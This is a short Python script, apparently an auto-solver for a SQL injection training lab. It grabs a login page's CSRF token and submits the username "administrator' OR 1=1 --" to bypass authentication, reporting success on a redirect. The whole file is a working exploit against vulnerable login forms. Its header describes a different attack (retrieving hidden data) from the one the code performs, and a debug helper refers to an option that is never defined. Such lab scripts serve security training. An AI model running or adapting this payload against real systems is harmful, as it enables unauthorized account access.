# POC Script for "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data" 

import argparse
import requests
import sys
import re

def success(text):
    print("[\033[32;1m+\033[0m] " + text + "\033[0m")

def failure(text):
    print("[\033[31;1m✘\033[0m] \033[31;1m" + text + "\033[0m")
    sys.exit()

def info(text):
	print("[\033[34;1m*\033[0m] " + text + "\033[0m")
     
def dbg(text):
    if args.debug:
        print("[\033[90m#\033[0m] " + text + "\033[0m")

def status(url):
     resp_obj = requests.get(url+"/login")
     if(resp_obj.status_code == 200):
        info("Host is reachable")
     else:
         failure("Host not reachable")

def csrf(url):
    session = requests.Session()
    resp_obj = session.get(url+"/login")
    csrf = re.search(r'name="csrf" value="(.*?)"', resp_obj.text)
    if not csrf:
        failure("CSRF token not found")
    return csrf, session

if __name__ == "__main__":
    info("Starting Auto Solve Script - SQLi Lab 2")
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("--url", required=True, help="URL of the victim application")
    args = parser.parse_args()
    url = args.url.rstrip('/')
    
    status(url)
    csrf_match, session = csrf(url)
    csrf_token = csrf_match.group(1)

    info("Sending Request to: " + url)

    params = {
        "csrf": csrf_token,
        "username": "administrator' OR 1=1 --",
        "password": "test"
    }

    success_obj = session.post(url+"/login", data=params, allow_redirects=False)
    if(success_obj.status_code == 302):
        success("The lab has been Completed")
    else:
        failure("The lab has Failed")

